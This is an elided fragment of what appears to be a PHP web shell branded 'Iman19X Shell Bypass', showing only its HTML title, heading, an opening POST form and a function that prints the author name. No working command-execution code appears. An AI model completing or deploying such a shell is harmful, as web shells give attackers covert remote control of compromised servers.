...
<html>
  ...
  <title>Iman19X Shell</title>
</head>
<body>
  <br></br>
  <center><h1>Iman19X Shell Bypass !! </h1></center>
</body>
<form method="post">
...
function author() {
	echo "<center><br>Iman19X Shell Bypass</center>";
	exit();
}
